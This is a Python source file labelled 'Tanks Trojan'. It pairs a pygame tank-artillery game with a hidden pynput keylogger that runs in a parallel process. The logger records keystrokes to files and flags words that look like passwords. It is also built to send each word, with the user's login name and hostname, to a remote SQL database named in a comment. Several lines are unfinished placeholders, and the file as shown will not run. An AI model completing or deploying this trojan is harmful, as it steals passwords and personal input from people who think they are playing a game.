#-------------------------------------------------------------------------------
# Name:        Tanks Trojan
# Purpose:
#
# Author:      Thomas Parker (Sorry)
#
# Created:     08/04/2013
# Copyright:   (c) Thomas 2013
#------------------------------------------------------------------------------
import pygame,os, math,random
from pygame.locals import *
from multiprocessing import Process
from pynput.keyboard import Key, Listener
import re
import socket
import pyodbc

def run_game():
    os.environ['SDL_VIDEODRIVER']='windib'
    pygame.init()
    screen = pygame.display.set_mode((1040, 480)) #1040px wide, 480px tall
    running = True
    red = (255,0,0) #red
    green = (0,255,0) #green
    pink = (255,0,255) #pink
    blue = (0,0,255) #blue
    n = 0 #Used throughour for counting
    sqrt_500 = math.sqrt(500) #Makes my life a little bit easier, with fewer brackets in expressions
    sqrt_425 = math.sqrt(425)
    FIRED = False
    headx = 80 #the x value for where to draw the head of the tank (The big Circle)
    heady = 65 #the y value for where to draw the head of the tank
    headyb = 60 #This is the heady value -5, just because the barrel looks better coming from this angle than the exact centre
    flat_back_degree = 0 #The angle that the tank is on, used to draw the tank as well as tell how tilted it is
    flat_front_degree = 0 #Same as flat_back_degree, except multiplied by -1
    top_back_degree = 26.565 #The degree from the bottom middle of the tank, to the top of the back treads, used to draw the black line that is the treads
    top_front_degree = 26.565 #Same as top_back_degree except for the front
    front_wheel_degree = 14.036 #Degree from the bottom middle of the tank to the centre of the wheel
    back_wheel_degree = 14.036 #Same as front_wheel_degree except its for the back
    head_degree = 90 #angle from the bottom middle of the tank to the center of the head.
    gunpoint_degree = 0 #angle that the gun is pointed. The gun degree is independant from the rest of the tank.
    Craters = []
    Fire_Power = float(60)
    Tank_Centerx = 80
    Tank_Centery = 75
    ShotsFired = False
    while running: # main game loop
        for event in pygame.event.get():
            if event.type == QUIT:
                running = False

            if event.type == MOUSEBUTTONDOWN:
                power = pygame.mouse.get_pos()
                powerx = power[0]
                powery = power[1]
                if (powerx > 900) & (powerx <1021) & (powery > 20) & (powery < 51):
                    Fire_Power = float(powerx-900)
        screen.fill((0,0,255)) #erase the screen (r,g,b)
        keys = pygame.key.get_pressed()
        flat_back_radians = math.radians(flat_back_degree)
        flat_front_radians = math.radians(flat_front_degree)
        top_back_radians = math.radians(top_back_degree)
        top_front_radians = math.radians(top_front_degree)
        front_wheel_radians = math.radians(front_wheel_degree)
        back_wheel_radians = math.radians(back_wheel_degree)
        head_radians = math.radians(head_degree)
        headyb = heady -5
        b_bx = Tank_Centerx - (math.cos(flat_back_radians) * 20)
        b_by = Tank_Centery + (math.sin(flat_back_radians) *20)
        b_fx = Tank_Centerx + (math.cos(flat_front_radians) * 20)
        b_fy = Tank_Centery - (math.sin(flat_front_radians)*20)
        t_bx = Tank_Centerx - (math.cos(top_back_radians) * sqrt_500)
        t_by = Tank_Centery - (math.sin(top_back_radians) * sqrt_500)
        t_fx = Tank_Centerx + (math.cos(top_front_radians) * sqrt_500)
        t_fy = Tank_Centery - (math.sin(top_front_radians) * sqrt_500)
        fw_x = Tank_Centerx + (math.cos(front_wheel_radians) * sqrt_425)
        fw_y = Tank_Centery - (math.sin(front_wheel_radians) * sqrt_425)
        bw_x = Tank_Centerx - (math.cos(back_wheel_radians) * sqrt_425)
        bw_y = Tank_Centery - (math.sin(back_wheel_radians) * sqrt_425)
        headx = Tank_Centerx - (math.cos(head_radians) * 10)
        heady = Tank_Centery - (math.sin(head_radians) * 10)
        gunpointx = headx + (math.cos(gunpoint_degree) * 25)
        gunpointy = headyb - (math.sin(gunpoint_degree) * 25)
        bottom_back = (b_bx,b_by)
        bottom_front= (b_fx,b_fy)
        top_front = (t_fx,t_fy)
        top_back = (t_bx,t_by)
        nCraters = 0
        n = 0
        x = 0
        while n < 1040:
            period = x
            period = math.radians(period)
            y = int(math.sin(period)*250)/25 + 250
            pygame.draw.line(screen,green, (x,y),(x,305), 1)
            n = n + 1
            x = x + 1
        pygame.draw.rect(screen,green, (0,280,1040,200))
        while nCraters < len(Craters):
            xCraters = Craters[nCraters]
            yCraters = Craters[nCraters + 1]
            pygame.draw.circle(screen,blue,(int(xCraters),int(yCraters) - 10),25)
            nCraters = nCraters + 2
        front_check = screen.get_at((int(b_fx), int(b_fy)))
        back_check = screen.get_at((int(b_bx), int(b_by)))
        pygame.draw.polygon(screen, (255,0,255), (bottom_back, bottom_front, top_front, top_back))
        pygame.draw.circle(screen, (255,0,255), (int(headx),int(heady)), (10))
        pygame.draw.line(screen, (255,0,255), (headx,headyb), (gunpointx,gunpointy),3)
        pygame.draw.line(screen, (0,0,0),(t_bx,t_by), (t_fx,t_fy))
        pygame.draw.line(screen, (0,0,0),(b_bx,b_by), (b_fx,b_fy))
        pygame.draw.circle(screen,(0,0,0), (int(fw_x),int(fw_y)), (5))
        pygame.draw.circle(screen,(0,0,0), (int(bw_x),int(bw_y)), (5))
        pygame.draw.rect(screen,(0,0,0), (900,20,122,30), 1)
        pygame.draw.rect(screen, (255,255,255), (901,21,Fire_Power,28))
        ground_check = screen.get_at((int(Tank_Centerx), int(Tank_Centery) + 1))
        front_ground_check = screen.get_at((int(b_fx), int(b_fy) + 1))
        back_ground_check = screen.get_at((int(b_bx), int(b_by) + 1))
        if (ground_check == blue) & (front_ground_check == blue) & (back_ground_check == blue):
            Tank_Centery = Tank_Centery + 2
        elif (ground_check == green) & (front_ground_check == green) & (back_ground_check == green):
            Tank_Centery = Tank_Centery - 1
        if front_ground_check == blue:
            if flat_back_degree > -45:
                flat_back_degree = flat_back_degree - 1
                flat_front_degree = flat_front_degree - 1
                back_wheel_degree = back_wheel_degree + 1
                front_wheel_degree = front_wheel_degree - 1
                top_back_degree = top_back_degree + 1
                top_front_degree = top_front_degree - 1
                head_degree = head_degree + 1
        if back_ground_check == blue:
            if flat_back_degree <45:
                flat_back_degree = flat_back_degree + 1
                flat_front_degree = flat_front_degree + 1
                back_wheel_degree = back_wheel_degree - 1
                front_wheel_degree = front_wheel_degree + 1
                top_back_degree = top_back_degree - 1
                top_front_degree = top_front_degree + 1
                head_degree = head_degree - 1
        if front_check == green:
            if flat_back_degree <30:
                flat_back_degree = flat_back_degree + 2
                flat_front_degree = flat_front_degree + 2
                back_wheel_degree = back_wheel_degree - 2
                front_wheel_degree = front_wheel_degree + 2
                top_back_degree = top_back_degree - 2
                top_front_degree = top_front_degree + 2
                head_degree = head_degree - 2
                Tank_Centery = Tank_Centery - 1
            else:
                Tank_Centerx = Tank_Centerx - 1
        if back_check ==green:
            if flat_back_degree > -45:
                flat_back_degree = flat_back_degree - 2
                flat_front_degree = flat_front_degree - 2
                back_wheel_degree = back_wheel_degree + 2
                front_wheel_degree = front_wheel_degree - 2
                top_back_degree = top_back_degree + 2
                top_front_degree = top_front_degree - 2
                head_degree = head_degree + 2
                Tank_Centery = Tank_Centery -1
            else:
                Tank_Centerx = Tank_Centerx + 1
            if keys[K_s] ==1:
                Tank_Centery = Tank_Centery + 1
        if keys[K_a] == 1:
            if flat_back_degree < 45:
                flat_back_degree = flat_back_degree + 1
                flat_front_degree = flat_front_degree + 1
                back_wheel_degree = back_wheel_degree - 1
                front_wheel_degree = front_wheel_degree + 1
                top_back_degree = top_back_degree - 1
                top_front_degree = top_front_degree + 1
                head_degree = head_degree - 1
        if keys[K_d] == 1:
            if flat_back_degree > -60:
                flat_back_degree = flat_back_degree -1
                flat_front_degree = flat_front_degree -1
                back_wheel_degree = back_wheel_degree + 1
                front_wheel_degree = front_wheel_degree - 1
                top_back_degree = top_back_degree + 1
                top_front_degree = top_front_degree - 1
                head_degree = head_degree + 1
        if keys[K_RIGHT] == 1:
            front_wheel_check = screen.get_at((int(fw_x) + 2, int(fw_y) + 2))
            if front_wheel_check != green:
                Tank_Centerx = Tank_Centerx + 0.5
        if keys[K_LEFT] == 1:
            back_wheel_check = screen.get_at((int(bw_x) - 2, int(bw_y) + 2))
            if back_wheel_check != green:
                Tank_Centerx = Tank_Centerx - 0.5
        if keys[K_e] ==1:
            gunpoint_degree = gunpoint_degree + 0.01
        if keys[K_q] ==1:
            gunpoint_degree = gunpoint_degree - 0.01
        if gunpoint_degree < flat_front_radians:
            gunpoint_degree = flat_front_radians
        if gunpoint_degree > flat_back_radians + math.pi:
            gunpoint_degree = flat_back_radians + math.pi
        if Tank_Centerx > 1000:
            Tank_Centerx = 1000
        if Tank_Centerx < 30:
            Tank_Centerx = 30
        r = 0
        if FIRED == False:
            if keys[K_f] ==1:
                Shotx = int(gunpointx)
                Shoty = int(gunpointy)
                True_Power= float(Fire_Power/30)
                yvalue = math.sin(gunpoint_degree) *-(True_Power)
                shot_ground_check = (0,0,0)
                xvalue = math.cos(gunpoint_degree) *True_Power
                FIRED = True
        if FIRED == True:
            pygame.draw.circle(screen,(0,0,0), (int(Shotx),int(Shoty)), 5)
            yvalue = yvalue + 0.01
            Shotx = Shotx + xvalue
            Shoty = Shoty  + yvalue
            if (Shoty > 0) & (Shoty < 475) & (Shotx <1040) & (Shotx > 0):
                shot_ground_check = screen.get_at((int(Shotx), int (Shoty)+3))
            if (Shoty > 480) | (Shotx > 1040) | (Shotx < 0):
                FIRED = False
            pygame.draw.circle(screen,(0,0,0), (int(Shotx),int(Shoty)), 5)
            if shot_ground_check == green:
                Craters.insert(0,Shoty)
                Craters.insert(0,Shotx)
                FIRED = False
        pygame.display.flip() # draw the screen
    pygame.quit ()

#Server=tcp:words4hacks.database.windows.net,1433;Initial Catalog=Words;Persist Security Info=False;User ID=thomasparker;Password={your_password};MultipleActiveResultSets=False;Encrypt=True;TrustServerCertificate=False;Connection Timeout=30;
Insert your own connection string below vvvv
conn = pyodbc.connect('')
cursor = conn.cursor()


end_word_dict ={Key.tab: 1, Key.space:1, Key.right:1, Key.left:1, Key.up:1, Key.down:1, Key.enter:1}
current_word = ""
words = open("loggedwords.txt",'w')
raw = open("loggedkeys.txt",'w')

def log_key(key):
    key = str(key)
    #print (key[0:3])
    if key[0:3] != "Key":
        raw.write(key + "\n")
    else:
        raw.write(key[4:] +"\n")

def on_press(key):
    #print('{0} pressed'.format(key))
    pass


def check_if_password(word):
    if re.search("[a-z]+",word) and re.search("[A-Z]+",word) and re.search("[0-9]+",word) and \
    (re.search("[!-/]+",word) or re.search("[:-@]+]",word) or re.search("[[-`]+",word) or re.search("[{-~]+"),word):
        return(True)
    else:
        return(False)

def insert_word(word):
    global conn
    global cursor
    print(word)
    if len(word) >= 1:
        password = check_if_password(word)
        login = os.getlogin()
        create Query here vvvv
        Query = 
        computertype = socket.gethostname()
        cursor.execute(Query)
        conn.commit()


def on_release(key):
    global current_word
    server =
    database =
    username = 
    password = 
    #Server=tcp:words4hacks.database.windows.net,1433;Initial Catalog=Words;Persist Security Info=False;User ID=thomasparker;Password={your_password};MultipleActiveResultSets=False;Encrypt=True;TrustServerCertificate=False;Connection Timeout=30;

    conn = 
    cursor = conn.cursor()


    end_word_dict ={Key.tab: 1, Key.space:1, Key.right:1, Key.left:1, Key.up:1, Key.down:1, Key.enter:1}
    words = open("loggedwords.txt",'w')
    raw = open("loggedkeys.txt",'w')
    log_key(key)
    if key in end_word_dict:
        print(current_word)
        insert_word(current_word)
        current_word = ""
    elif key == Key.backspace:
        current_word= current_word[:-1]
    else:
        if str(key)[0:3] != "Key":

            current_word += str(key)[1]
    if key == Key.esc:
        # Stop listener
        return False

# Collect events until released
def HacksFunction():
    with Listener(
            on_press=on_press,
            on_release=on_release) as listener:
        listener.join()
    words.close()
    raw.close()


if __name__ == '__main__':
    hack_thread = Process(target = HacksFunction, args=())
    game_thread = Process(target =  run_game, args = ())
    game_thread.start()
    hack_thread.start()
    game_thread.join()
    hack_thread.join()

